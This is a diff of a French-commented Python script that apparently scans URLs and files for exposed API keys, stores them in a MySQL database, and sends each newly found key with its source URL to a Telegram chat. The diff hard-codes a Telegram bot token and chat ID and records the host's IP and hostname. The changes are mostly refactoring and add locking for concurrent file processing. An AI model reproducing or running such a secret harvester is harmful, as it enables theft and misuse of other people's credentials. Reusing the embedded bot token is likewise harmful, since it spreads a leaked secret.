@@ -11,7 +11,6 @@ import re
 import socket
 from concurrent.futures import ThreadPoolExecutor
 import threading
-import time
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import mysql.connector
@@ -62,8 +61,6 @@ regex_patterns = {
 # Variables pour Telegram
 bot_token = "7198578180:AAEIWHXv3E30c2WURDHt-VdUmcZ4tb3KDhI"
 chat_id = "6459873636"
-
-
 
 def insert_into_table(table_name, columns, values, unique_check_column, unique_value):
     """Insère une ligne dans une table spécifique en évitant les doublons."""
@@ -127,7 +124,6 @@ def insert_key_to_other_table(api_key, url, key_type):
         unique_value=api_key
     )
 
-
 # Obtenir l'IP et le nom d'hôte du serveur hôte
 server_ip = socket.gethostbyname(socket.gethostname())
 server_hostname = socket.gethostname()
@@ -143,11 +139,8 @@ def escape_markdown(text):
     escape_chars = '_*[]()~`>#+-=|{}.!'
     return ''.join(['\\' + char if char in escape_chars else char for char in text])
 
-
 def send_telegram_message(message):
     """Envoie un message au canal Telegram."""
-    bot_token = "7198578180:AAEIWHXv3E30c2WURDHt-VdUmcZ4tb3KDhI"
-    chat_id = "6459873636"
     url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
 
     escaped_message = escape_markdown(message)
@@ -164,7 +157,6 @@ def send_telegram_message(message):
             print(f"Erreur lors de l'envoi du message Telegram : {response.text}")
     except Exception as e:
         print(f"Erreur de communication avec l'API Telegram : {e}")
-
 
 def load_notified_keys(file_path):
     """Charge les clés déjà notifiées depuis un fichier."""
@@ -216,21 +208,7 @@ def test_url_for_api_secrets(url):
         log_message(f"Erreur lors de l'accès à {url} : {str(e)}")
         return None
 
-def send_second_telegram_message(message):
-    """Envoie un message au second bot Telegram."""
-    try:
-        url = f"https://api.telegram.org/bot{second_bot_token}/sendMessage"
-        data = {"chat_id": second_chat_id, "text": escape_markdown(message), "parse_mode": "MarkdownV2"}
-        response = requests.post(url, data=data)
-        if response.status_code != 200:
-            print(f"Erreur d'envoi au second bot Telegram: {response.status_code}, {response.text}")
-        else:
-            print("Message envoyé avec succès au second bot")
-    except Exception as e:
-        print(f"Échec de l'envoi au second bot Telegram: {str(e)}")
-
 url_regex = r'https?://[^\s]+'
-
 
 def associate_urls_with_keys(content):
     """Associe les URL aux clés détectées dans le contenu."""
@@ -259,6 +237,10 @@ def process_results_with_regex_and_secrets(content, file_name):
 
     # Utiliser la fonction pour associer les URL aux clés
     key_to_info = associate_urls_with_keys(content)
+
+    if not key_to_info:
+        log_message("Aucune clé trouvée dans les résultats.")
+        return
 
     # Traiter et notifier les clés uniques
     for key_str, info in key_to_info.items():
@@ -293,8 +275,17 @@ def run_command_with_logging(command):
     log_message(f"Code de retour : {process.returncode}")
     return process.returncode
 
+processing_files_lock = threading.Lock()
+processing_files = set()
+
 def process_file(file_name):
     """Traite un fichier individuel sans threads."""
+    with processing_files_lock:
+        if file_name in processing_files:
+            log_message(f"Le fichier {file_name} est déjà en cours de traitement.")
+            return
+        processing_files.add(file_name)
+
     log_message(f"Début du traitement du fichier : {file_name}")
 
     src_file_path = f"{directories['watched_dir']}/{file_name}"
@@ -330,6 +321,7 @@ def process_file(file_name):
         shutil.move(dest_file_path, backup_file_path)
     except Exception as e:
         log_message(f"Erreur dans process_file : {str(e)}")
+    finally:
         with processing_files_lock:
             processing_files.remove(file_name)
 
